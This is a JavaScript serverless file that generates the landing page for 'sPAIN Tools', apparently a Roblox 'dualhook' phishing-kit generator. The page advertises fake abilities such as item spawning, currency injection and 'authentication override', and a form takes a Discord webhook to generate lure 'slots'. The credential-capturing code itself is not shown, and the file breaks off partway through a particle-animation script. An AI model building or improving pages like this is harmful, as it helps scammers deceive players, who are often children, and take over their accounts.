// api/page.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}
// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
function build404() {
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Not Found — sPAIN Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500&display=swap" rel="stylesheet">
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#080810;color:#f0f0f8;font-family:'Inter',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px}h1{font-family:'Orbitron',sans-serif;font-size:clamp(3rem,10vw,7rem);font-weight:900;background:linear-gradient(135deg,#f0abfc,#c026d3,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:16px}p{color:#5a5a78;margin-bottom:32px}a{background:linear-gradient(135deg,#c026d3,#a855f7);color:#fff;padding:14px 32px;border-radius:10px;text-decoration:none;font-weight:600;box-shadow:0 0 30px rgba(192,38,211,0.4)}</style>
</head><body><h1>404</h1><p>This page hasn\'t been claimed yet.</p><a href="/">Back to sPAIN Tools</a></body></html>`;
}

function buildDualhookPage(record) {
  const SLUG = record.slug;
  const charSrc = record.charUrl || 'https://tr.rbxcdn.com/30DAY-Avatar-D7AA065464297A80748737C0DCD67BB4-Png/720/720/Avatar/Webp/noFilter';
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>sPAIN Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #080810;
    --surface: #0f0f18;
    --surface2: #16162a;
    --border: rgba(255,255,255,0.06);
    --accent: #c026d3;
    --accent2: #a855f7;
    --accent3: #06b6d4;
    --accent-glow: rgba(192,38,211,0.4);
    --cyan-glow: rgba(6,182,212,0.3);
    --text: #f0f0f8;
    --muted: #5a5a78;
    --card: #0d0d1a;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }
  html { scroll-behavior: smooth; }
  body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow-x: hidden; }

  body::after {
    content: '';
    position: fixed; inset: 0;
    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
    pointer-events: none; z-index: 9998; opacity: 0.5;
  }

  .bg-grid {
    position: fixed; inset: 0;
    background-image: linear-gradient(rgba(192,38,211,0.04) 1px, transparent 1px), linear-gradient(90deg, rgba(192,38,211,0.04) 1px, transparent 1px);
    background-size: 60px 60px; pointer-events: none; z-index: 0;
    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 20%, transparent 100%);
  }

  .aurora { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
  .aurora-blob { position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.12; animation: drift 12s ease-in-out infinite alternate; }
  .aurora-blob:nth-child(1) { width: 800px; height: 800px; background: var(--accent); top: -200px; left: -200px; animation-duration: 14s; }
  .aurora-blob:nth-child(2) { width: 600px; height: 600px; background: var(--accent2); bottom: -150px; right: -100px; animation-duration: 18s; animation-delay: -5s; }
  .aurora-blob:nth-child(3) { width: 500px; height: 500px; background: var(--accent3); top: 40%; left: 60%; animation-duration: 22s; animation-delay: -8s; opacity: 0.08; }
  @keyframes drift { from { transform: translate(0,0) scale(1); } to { transform: translate(60px,40px) scale(1.1); } }

  .roblox-scene { position: absolute; inset: 0; pointer-events: none; z-index: 2; overflow: hidden; }
  .roblox-char {
    position: absolute;
    filter: drop-shadow(0 0 30px rgba(192,38,211,0.6)) drop-shadow(0 0 60px rgba(168,85,247,0.3));
    animation: floatChar var(--dur, 8s) ease-in-out infinite;
    animation-delay: var(--delay, 0s);
    transform-origin: center bottom;
  }
  .roblox-char img { width: var(--size, 180px); height: var(--size, 180px); object-fit: contain; display: block; }
  .char-1 { --size: 200px; --dur: 7s;  --delay: 0s;  left: 2%;  top: 12%; }
  .char-2 { --size: 160px; --dur: 9s;  --delay: -2s; right: 3%; top: 8%;  }
  .char-3 { --size: 140px; --dur: 11s; --delay: -4s; left: 8%;  bottom: 15%; }
  .char-4 { --size: 170px; --dur: 8s;  --delay: -6s; right: 6%; bottom: 20%; }
  .char-5 { --size: 120px; --dur: 10s; --delay: -3s; left: 20%; top: 5%;  }
  .char-6 { --size: 130px; --dur: 12s; --delay: -7s; right: 18%;top: 10%; }
  @keyframes floatChar {
    0%   { transform: translateY(0px) rotate(-2deg); }
    25%  { transform: translateY(-18px) rotate(1deg); }
    50%  { transform: translateY(-30px) rotate(-1deg); }
    75%  { transform: translateY(-14px) rotate(2deg); }
    100% { transform: translateY(0px) rotate(-2deg); }
  }
  .char-1,.char-3,.char-6 { animation-name: floatCharFlip; }
  @keyframes floatCharFlip {
    0%   { transform: scaleX(-1) translateY(0px) rotate(2deg); }
    25%  { transform: scaleX(-1) translateY(-18px) rotate(-1deg); }
    50%  { transform: scaleX(-1) translateY(-30px) rotate(1deg); }
    75%  { transform: scaleX(-1) translateY(-14px) rotate(-2deg); }
    100% { transform: scaleX(-1) translateY(0px) rotate(2deg); }
  }
  .char-shadow {
    position: absolute; width: calc(var(--size,180px)*0.7); height: 12px;
    background: radial-gradient(ellipse, rgba(192,38,211,0.5) 0%, transparent 70%);
    bottom: -8px; left: 50%; transform: translateX(-50%);
    animation: shadowPulse var(--dur,8s) ease-in-out infinite; animation-delay: var(--delay,0s); border-radius: 50%;
  }
  @keyframes shadowPulse { 0%,100%{opacity:0.5;transform:translateX(-50%) scaleX(1)} 50%{opacity:0.2;transform:translateX(-50%) scaleX(0.7)} }

  #particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; }

  /* NAV */
  nav {
    position: fixed; top: 0; left: 0; right: 0; z-index: 500;
    display: flex; align-items: center; justify-content: space-between;
    padding: 18px 48px;
    background: rgba(8,8,16,0.7);
    backdrop-filter: blur(24px) saturate(180%);
    border-bottom: 1px solid rgba(192,38,211,0.15);
  }
  nav::after {
    content: ''; position: absolute; bottom: 0; left: 10%; right: 10%; height: 1px;
    background: linear-gradient(90deg, transparent, rgba(192,38,211,0.4), rgba(168,85,247,0.4), transparent);
  }
  .logo { font-family: 'Orbitron', sans-serif; font-size: 1.4rem; font-weight: 900; letter-spacing: 0.05em; }
  .logo span { color: var(--accent); text-shadow: 0 0 20px var(--accent-glow); }
  nav ul { display: flex; gap: 36px; list-style: none; }
  nav ul a { color: var(--muted); text-decoration: none; font-size: 0.82rem; font-weight: 500; letter-spacing: 0.1em; text-transform: uppercase; transition: color 0.2s; }
  nav ul a:hover { color: var(--text); }
  .nav-cta { background: linear-gradient(135deg, var(--accent), var(--accent2)) !important; color: #fff !important; padding: 9px 22px; border-radius: 8px; font-weight: 600 !important; box-shadow: 0 0 20px rgba(192,38,211,0.3); transition: box-shadow 0.2s !important, transform 0.2s !important; }
  .nav-cta:hover { box-shadow: 0 0 36px rgba(192,38,211,0.6) !important; transform: translateY(-1px); color: #fff !important; }

  /* HERO */
  .hero { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 120px 24px 80px; position: relative; z-index: 3; overflow: hidden; }
  .hero-glow { position: absolute; width: 900px; height: 900px; border-radius: 50%; background: radial-gradient(circle, rgba(192,38,211,0.15) 0%, rgba(168,85,247,0.08) 40%, transparent 70%); top: 50%; left: 50%; transform: translate(-50%,-50%); pointer-events: none; animation: heroPulse 5s ease-in-out infinite; }
  @keyframes heroPulse { 0%,100%{opacity:0.8;transform:translate(-50%,-50%) scale(1)} 50%{opacity:1;transform:translate(-50%,-50%) scale(1.12)} }
  .hero-ring { position: absolute; width: 600px; height: 600px; border-radius: 50%; border: 1px solid rgba(192,38,211,0.12); top: 50%; left: 50%; transform: translate(-50%,-50%); animation: spinRing 25s linear infinite; }
  .hero-ring::after { content: ''; position: absolute; width: 10px; height: 10px; background: var(--accent); border-radius: 50%; top: -5px; left: 50%; box-shadow: 0 0 20px var(--accent); }
  .hero-ring-2 { width: 780px; height: 780px; border-color: rgba(168,85,247,0.07); animation-duration: 38s; animation-direction: reverse; }
  @keyframes spinRing { from{transform:translate(-50%,-50%) rotate(0deg)} to{transform:translate(-50%,-50%) rotate(360deg)} }
  .hero-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(192,38,211,0.1); border: 1px solid rgba(192,38,211,0.28); border-radius: 100px; padding: 7px 18px; font-size: 0.72rem; font-weight: 600; letter-spacing: 0.12em; text-transform: uppercase; color: #e879f9; margin-bottom: 32px; animation: fadeUp 0.7s ease both; backdrop-filter: blur(10px); position: relative; z-index: 5; }
  .hero-badge::before { content: ''; width: 6px; height: 6px; background: #e879f9; border-radius: 50%; box-shadow: 0 0 8px #e879f9; animation: blink 1.5s infinite; }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
  .hero h1 { font-family: 'Orbitron', sans-serif; font-size: clamp(3.5rem,9vw,7.5rem); font-weight: 900; line-height: 0.95; letter-spacing: -0.03em; margin-bottom: 28px; animation: fadeUp 0.7s 0.12s ease both; position: relative; z-index: 5; }
  .hero h1 .glow-text { background: linear-gradient(135deg, #f0abfc, #c026d3, #a855f7, #7c3aed); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; filter: drop-shadow(0 0 40px rgba(192,38,211,0.5)); animation: textShimmer 3s ease-in-out infinite alternate; }
  @keyframes textShimmer { from{filter:drop-shadow(0 0 30px rgba(192,38,211,0.4))} to{filter:drop-shadow(0 0 60px rgba(192,38,211,0.8))} }
  .hero p { max-width: 500px; color: #7070a0; font-size: 1.05rem; line-height: 1.75; margin-bottom: 44px; animation: fadeUp 0.7s 0.22s ease both; position: relative; z-index: 5; }
  .hero-buttons { display: flex; gap: 14px; animation: fadeUp 0.7s 0.32s ease both; position: relative; z-index: 5; }
  @keyframes fadeUp { from{opacity:0;transform:translateY(24px)} to{opacity:1;transform:translateY(0)} }
  .btn-primary { background: linear-gradient(135deg,#c026d3,#a855f7); color:#fff; border:none; padding:15px 36px; border-radius:10px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.06em; cursor:pointer; box-shadow:0 0 40px rgba(192,38,211,0.5),inset 0 1px 0 rgba(255,255,255,0.2); transition:transform 0.2s,box-shadow 0.2s; position:relative; overflow:hidden; }
  .btn-primary:hover { transform:translateY(-3px); box-shadow:0 0 60px rgba(192,38,211,0.7),0 8px 32px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.2); }
  .btn-ghost { background:rgba(255,255,255,0.03); color:var(--text); border:1px solid rgba(255,255,255,0.1); padding:15px 36px; border-radius:10px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:600; letter-spacing:0.06em; cursor:pointer; backdrop-filter:blur(10px); transition:border-color 0.2s,background 0.2s,transform 0.2s; }
  .btn-ghost:hover { border-color:rgba(192,38,211,0.5); background:rgba(192,38,211,0.08); transform:translateY(-3px); }
  .scroll-indicator { position:absolute; bottom:36px; left:50%; transform:translateX(-50%); display:flex; flex-direction:column; align-items:center; gap:8px; opacity:0.4; animation:fadeUp 1s 1s ease both; z-index:5; }
  .scroll-line { width:1px; height:40px; background:linear-gradient(to bottom,transparent,var(--accent)); animation:scrollLine 1.8s ease-in-out infinite; }
  @keyframes scrollLine { 0%{transform:scaleY(0);transform-origin:top} 50%{transform:scaleY(1);transform-origin:top} 51%{transform:scaleY(1);transform-origin:bottom} 100%{transform:scaleY(0);transform-origin:bottom} }
  .scroll-text { font-size:0.65rem; letter-spacing:0.2em; text-transform:uppercase; color:var(--muted); }

  /* TICKER */
  .ticker-wrap { width:100%; overflow:hidden; border-top:1px solid rgba(192,38,211,0.1); border-bottom:1px solid rgba(192,38,211,0.1); background:rgba(192,38,211,0.04); padding:12px 0; position:relative; z-index:3; }
  .ticker-track { display:flex; animation:ticker 30s linear infinite; width:max-content; }
  .ticker-item { padding:0 40px; font-family:'Orbitron',sans-serif; font-size:0.7rem; font-weight:700; letter-spacing:0.15em; text-transform:uppercase; color:var(--muted); white-space:nowrap; display:flex; align-items:center; gap:14px; }
  .ticker-item .dot { width:4px; height:4px; background:var(--accent); border-radius:50%; box-shadow:0 0 8px var(--accent); }
  @keyframes ticker { from{transform:translateX(0)} to{transform:translateX(-50%)} }

  .divider { border:none; height:1px; background:linear-gradient(90deg,transparent,rgba(192,38,211,0.2),rgba(168,85,247,0.2),transparent); margin:0 auto; max-width:900px; position:relative; z-index:3; }
  section { position:relative; z-index:3; }
  .section-label { text-align:center; font-size:0.72rem; font-weight:600; letter-spacing:0.18em; text-transform:uppercase; color:var(--accent); margin-bottom:14px; text-shadow:0 0 20px var(--accent-glow); }
  .section-title { text-align:center; font-family:'Orbitron',sans-serif; font-size:clamp(1.6rem,4vw,2.8rem); font-weight:700; margin-bottom:64px; letter-spacing:-0.02em; }

  /* FEATURES */
  .features { padding:110px 48px; max-width:1200px; margin:0 auto; }
  .features-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:1px; background:rgba(192,38,211,0.1); border:1px solid rgba(192,38,211,0.12); border-radius:20px; overflow:hidden; box-shadow:0 0 60px rgba(192,38,211,0.06); }
  .feature-card { background:var(--surface); padding:48px 44px; position:relative; transition:background 0.3s; overflow:hidden; }
  .feature-card::after { content:''; position:absolute; top:0; right:0; width:120px; height:120px; background:radial-gradient(circle,rgba(192,38,211,0.08) 0%,transparent 70%); pointer-events:none; }
  .feature-card:hover { background:var(--surface2); }
  .feature-icon { width:52px; height:52px; border-radius:14px; background:rgba(192,38,211,0.1); border:1px solid rgba(192,38,211,0.22); display:flex; align-items:center; justify-content:center; margin-bottom:22px; font-size:1.5rem; box-shadow:0 0 20px rgba(192,38,211,0.15); }
  .feature-card h3 { font-family:'Rajdhani',sans-serif; font-size:1.3rem; font-weight:700; letter-spacing:0.05em; margin-bottom:12px; color:var(--text); }
  .feature-card p { font-size:0.9rem; color:var(--muted); line-height:1.7; }

  /* PRODUCTS */
  .products { padding:110px 48px; max-width:1200px; margin:0 auto; }

  /* FORM CARD */
  .slots-form-wrap {
    max-width:640px; margin:0 auto;
    background:var(--card);
    border:1px solid rgba(192,38,211,0.15);
    border-radius:20px;
    padding:38px 42px 42px;
    box-shadow:0 0 60px rgba(192,38,211,0.06),0 20px 60px rgba(0,0,0,0.4);
    position:relative; overflow:hidden;
  }
  .slots-form-wrap::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3)); }
  .slots-form-wrap::after { content:''; position:absolute; bottom:-60px; right:-60px; width:200px; height:200px; background:radial-gradient(circle,rgba(192,38,211,0.07) 0%,transparent 70%); pointer-events:none; }

  .input-group { margin-bottom:16px; }
  .input-label { display:block; font-size:0.7rem; font-weight:600; letter-spacing:0.12em; text-transform:uppercase; color:var(--muted); margin-bottom:9px; }
  .input-duo { display:grid; grid-template-columns:1fr 1fr; gap:14px; }

  .url-display { display:flex; align-items:center; gap:10px; background:rgba(192,38,211,0.04); border:1px solid rgba(192,38,211,0.12); border-radius:10px; padding:11px 14px; overflow:hidden; }
  .url-icon { width:28px; height:28px; background:rgba(192,38,211,0.1); border:1px solid rgba(192,38,211,0.22); border-radius:8px; display:flex; align-items:center; justify-content:center; flex-shrink:0; font-size:0.75rem; }
  .url-text { flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:#8844aa; font-family:'Orbitron',sans-serif; font-size:0.68rem; letter-spacing:0.04em; }

  .field-input { width:100%; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.07); border-radius:10px; padding:11px 14px; color:var(--text); font-family:'Inter',sans-serif; font-size:0.88rem; outline:none; transition:border-color 0.2s,box-shadow 0.2s; }
  .field-input::placeholder { color:rgba(90,90,120,0.7); }
  .field-input:focus { border-color:rgba(192,38,211,0.4); box-shadow:0 0 0 3px rgba(192,38,211,0.08); }

  .opt-badge { font-size:0.58rem; background:rgba(168,85,247,0.12); border:1px solid rgba(168,85,247,0.25); color:#a855f7; padding:1px 6px; border-radius:4px; margin-left:6px; letter-spacing:0.08em; vertical-align:middle; }

  .slots-generate-btn { width:100%; background:linear-gradient(135deg,var(--accent),var(--accent2)); color:#fff; border:none; padding:15px 0; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; cursor:pointer; box-shadow:0 0 36px rgba(192,38,211,0.4); transition:transform 0.2s,box-shadow 0.2s,opacity 0.2s; position:relative; overflow:hidden; }
  .slots-generate-btn:hover { transform:translateY(-2px); box-shadow:0 0 56px rgba(192,38,211,0.65); }
  .slots-generate-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }

  /* COMMUNITY */
  .community { padding:110px 48px; text-align:center; position:relative; overflow:hidden; }
  .community::before { content:''; position:absolute; inset:0; background:radial-gradient(ellipse at center,rgba(192,38,211,0.07) 0%,transparent 65%); pointer-events:none; }
  .community h2 { font-family:'Orbitron',sans-serif; font-size:clamp(1.8rem,4vw,3.2rem); font-weight:700; margin-bottom:18px; letter-spacing:-0.02em; }
  .community p { color:var(--muted); font-size:1rem; max-width:460px; margin:0 auto 44px; line-height:1.7; }
  .community-stats { display:flex; justify-content:center; gap:70px; margin-bottom:48px; }
  .stat { display:flex; flex-direction:column; align-items:center; gap:6px; }
  .stat-num { font-family:'Orbitron',sans-serif; font-size:2.4rem; font-weight:900; background:linear-gradient(135deg,#f0abfc,#c026d3); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; filter:drop-shadow(0 0 20px rgba(192,38,211,0.4)); }
  .stat-label { font-size:0.75rem; color:var(--muted); letter-spacing:0.1em; text-transform:uppercase; }
  .discord-btn { display:inline-flex; align-items:center; gap:12px; background:#5865F2; color:#fff; border:none; padding:15px 36px; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.06em; cursor:pointer; box-shadow:0 0 36px rgba(88,101,242,0.4); transition:background 0.2s,transform 0.2s,box-shadow 0.2s; }
  .discord-btn:hover { background:#4752C4; transform:translateY(-3px); box-shadow:0 0 56px rgba(88,101,242,0.6); }

  /* FOOTER */
  footer { border-top:1px solid rgba(192,38,211,0.1); padding:32px 48px; display:flex; align-items:center; justify-content:space-between; color:var(--muted); font-size:0.8rem; position:relative; z-index:3; }
  footer::before { content:''; position:absolute; top:0; left:10%; right:10%; height:1px; background:linear-gradient(90deg,transparent,rgba(192,38,211,0.3),transparent); }
  .footer-logo { font-family:'Orbitron',sans-serif; font-size:1rem; font-weight:700; color:var(--text); }
  .footer-logo span { color:var(--accent); text-shadow:0 0 12px var(--accent-glow); }

/* ========== MOBILE RESPONSIVE ========== */
  @media (max-width: 768px) {
    /* Navigation */
    nav { padding: 14px 16px; }
    nav ul { gap: 12px; }
    nav ul a { font-size: 0.65rem; letter-spacing: 0.05em; }
    .nav-cta { padding: 8px 14px !important; font-size: 0.6rem !important; white-space: nowrap !important; }
    .logo { font-size: 1.1rem; }

    /* Hero */
    .hero { padding: 100px 16px 60px; min-height: auto; }
    .hero h1 { font-size: clamp(2.2rem, 10vw, 3.5rem); margin-bottom: 20px; }
    .hero p { font-size: 0.9rem; padding: 0 10px; margin-bottom: 32px; }
    .hero-buttons { flex-direction: column; width: 100%; max-width: 280px; gap: 12px; }
    .btn-primary, .btn-ghost { width: 100%; padding: 14px 24px; font-size: 0.95rem; }
    .hero-badge { font-size: 0.65rem; padding: 6px 14px; margin-bottom: 24px; }
    
    /* FIX: Scroll indicator centered */
    .scroll-indicator {
      left: 50% !important;
      transform: translateX(-50%) !important;
      right: auto !important;
      width: 100% !important;
      text-align: center !important;
      bottom: 20px !important;
    }

    /* FIX: Roblox characters - show small cute versions */
    .roblox-char { 
      position: fixed !important;
      width: 65px !important;
      height: 65px !important;
      opacity: 0.7 !important;
      z-index: 5 !important;
      pointer-events: none !important;
    }
    .roblox-char img { width: 65px !important; height: 65px !important; }
    .char-1 { left: 5px !important; top: 80px !important; --size: 65px !important; }
    .char-2 { right: 5px !important; top: 100px !important; --size: 55px !important; }
    .char-3 { left: 10px !important; bottom: 100px !important; --size: 50px !important; }
    .char-4 { right: 10px !important; bottom: 120px !important; --size: 60px !important; }
    .char-5 { left: 50% !important; top: 70px !important; transform: translateX(-50%) !important; --size: 45px !important; }
    .char-6 { display: none !important; }
    .char-shadow { display: none !important; }

    /* Features - SINGLE COLUMN */
    .features { padding: 60px 16px; }
    .features-grid { grid-template-columns: 1fr; border-radius: 16px; }
    .feature-card { padding: 32px 24px; border-bottom: 1px solid rgba(192,38,211,0.1); }
    .feature-card:last-child { border-bottom: none; }
    .feature-icon { width: 44px; height: 44px; font-size: 1.3rem; margin-bottom: 16px; }
    .feature-card h3 { font-size: 1.1rem; }
    .feature-card p { font-size: 0.85rem; line-height: 1.6; }

    /* Products/Form */
    .products { padding: 60px 16px; }
    .slots-form-wrap { padding: 28px 20px 32px; margin: 0; border-radius: 16px; }
    .input-duo { grid-template-columns: 1fr; gap: 12px; }
    .field-input { padding: 12px 14px; font-size: 16px; }
    .url-text { font-size: 0.6rem; }

    /* Community */
    .community { padding: 60px 16px; }
    .community h2 { font-size: 1.6rem; }
    .community p { font-size: 0.9rem; padding: 0 10px; }
    .community-stats { flex-direction: column; gap: 24px; }
    .stat-num { font-size: 2rem; }
    .discord-btn { width: 100%; max-width: 300px; justify-content: center; padding: 14px 24px; }

    /* Footer */
    footer { flex-direction: column; gap: 12px; padding: 24px 16px; text-align: center; }

    /* Ticker */
    .ticker-item { padding: 0 24px; font-size: 0.6rem; }
    .section-title { font-size: 1.4rem; margin-bottom: 40px; }
    .section-label { font-size: 0.65rem; }
  }

  /* Extra small phones */
  @media (max-width: 380px) {
    .hero h1 { font-size: 2rem; }
    .roblox-char { width: 55px !important; height: 55px !important; }
    .roblox-char img { width: 55px !important; height: 55px !important; }
    .char-5 { display: none !important; }
  }

</style>
</head>
<body>

<div class="aurora"><div class="aurora-blob"></div><div class="aurora-blob"></div><div class="aurora-blob"></div></div>
<div class="bg-grid"></div>
<canvas id="particles"></canvas>

<nav>
  <div class="logo">s<span>PAIN</span> Tools</div>
  <ul>
    <li><a href="#features">Features</a></li>
    <li><a href="#products">Products</a></li>
    <li><a href="#community">Community</a></li>
    <li><a href="#community" class="nav-cta">Get Started</a></li>
  </ul>
</nav>

<section class="hero">
  <div class="hero-glow"></div>
  <div class="hero-ring"></div>
  <div class="hero-ring hero-ring-2"></div>

  <div class="roblox-scene">
    <div class="roblox-char char-1"><img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-2"><img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-3"><img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-4"><img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-5"><img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-6"><img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
  </div>

  <div class="hero-badge">Roblox Toolkit — v2.0</div>
  <h1>s<span class="glow-text">PAIN</span><br>Tools</h1>
  <p>BEST OF BEST SITE EVER.</p>
  <div class="hero-buttons">
    <button class="btn-primary" onclick="document.getElementById('products').scrollIntoView({behavior:'smooth'})">Browse Products</button>
    <button class="btn-ghost" onclick="document.getElementById('features').scrollIntoView({behavior:'smooth'})">Learn More</button>
  </div>
  <div class="scroll-indicator">
    <div class="scroll-line"></div>
    <span class="scroll-text">Scroll</span>
  </div>
</section>

<div class="ticker-wrap"><div class="ticker-track" id="tickerTrack"></div></div>
<hr class="divider" style="margin-top:0;margin-bottom:0;">

<section class="features" id="features">
  <div class="section-label">Why sPAIN Tools</div>
  <h2 class="section-title">Built Different</h2>
  <div class="features-grid">
    <div class="feature-card"><div class="feature-icon">⚡</div><h3>Instant Replication</h3><p>Mirror any avatar's appearance instantly. Duplicate outfits, animations, and accessories directly to your inventory without marketplace restrictions. (Connects to: Clothing Copier)</p></div>
    <div class="feature-card"><div class="feature-icon">🚀</div><h3>Game Harvesting</h3><p>Extract and archive entire game libraries, scripts, and uncopylocked experiences. Full asset pipeline from target to local storage. (Connects to: Copy Games, Uncopylocked Games Extractor)</p></div>
    <div class="feature-card"><div class="feature-icon">🔗</div><h3>Inventory Injection</h3><p>Spawn rare limiteds, premium items, and account currency directly into authenticated sessions. No trading required. (Connects to: Item Giver)</p></div>
    <div class="feature-card"><div class="feature-icon">🔒</div><h3>Access</h3><p>Unlock restricted features, private servers, and age-gated content instantly. Full authentication override for complete platform access. (Connects to: Chat/Mic Unlocker, Game Joiner, Follower Bot)</p></div>
  </div>
</section>

<hr class="divider">

<section class="products" id="products">
  <div class="section-label">Browse Our Products</div>
  <h2 class="section-title">Discover All of Our Tools</h2>

  <div class="slots-form-wrap">

    <div class="input-group">
      <label class="input-label">URL</label>
      <div class="url-display">
        <span class="url-icon">🔗</span>
        <span class="url-text" id="slotsAutoUrl">https://spain-tools.vercel.app/sPAINTools</span>
      </div>
    </div>

    <div class="input-duo" style="margin-bottom:16px;">
      <div>
        <label class="input-label">Directory Name</label>
        <input class="field-input" type="text" id="sf-dirName" placeholder="sPAINTools" oninput="updateSlotsUrl()">
      </div>
      <div>
        <label class="input-label">Display Name</label>
        <input class="field-input" type="text" id="sf-dispName" placeholder="sPAIN Tools">
      </div>
    </div>

    <div class="input-group">
      <label class="input-label">Roblox Character URL <span class="opt-badge">optional</span></label>
      <input class="field-input" type="text" id="sf-charUrl" placeholder="https://tr.rbxcdn.com/...">
    </div>

    <div class="input-group" style="margin-bottom:28px;">
      <label class="input-label">Webhook</label>
      <input class="field-input" type="text" id="sf-webhook" placeholder="https://discord.com/api/webhooks/...">
    </div>

    <button class="slots-generate-btn" onclick="handleGenerate()">Generate Slots 1&ndash;9</button>
  </div>
</section>

<hr class="divider">

<section class="community" id="community">
  <div class="section-label">Join the Movement</div>
  <h2>Community</h2>
  <p>Connect with thousands of sPAIN Tools users, get support, share scripts, and stay updated on new releases.</p>
  <div class="community-stats">
    <div class="stat"><div class="stat-num" data-target="12000">0</div><div class="stat-label">Members</div></div>
    <div class="stat"><div class="stat-num" data-target="99" data-suffix="%">0%</div><div class="stat-label">Uptime</div></div>
    <div class="stat"><div class="stat-num">24/7</div><div class="stat-label">Support</div></div>
  </div>
  <button class="discord-btn">
    <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
    Join our Discord
  </button>
</section>

<footer>
  <div class="footer-logo">s<span>PAIN</span> Tools</div>
  <div>© 2025 sPAIN Tools. All rights reserved.</div>
  <div>Built for Roblox.</div>
</footer>

<script>
/* ── PARTICLES ── */
(function(){
  const canvas = document.getElementById('particles');
  const ctx = canvas.getContext('2d');
  let W, H, particles = [];
  function resize(){ W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; }
  resize(); window.addEventListener('resize', resize);
  const COLORS = ['rgba(192,38,211,','rgba(168,85,247,','rgba(6,182,212,','rgba(232,121,249,'];
  class Particle {
    constructor(){ this.x=Math.random()*W; this.y=Math.random()*H; this.vx=(Math.random()-0.5)*0.3; this.vy=(Math.random()-0.5)*0.3-0.1; this.r=Math.random()*1.5+0.3; this.alpha=Math.random()*0.5+0.1; this.color=COLORS[Math.floor(Math.random()*COLORS.length)]; this.life=0; this.maxLife=200+Math.random()*300; }
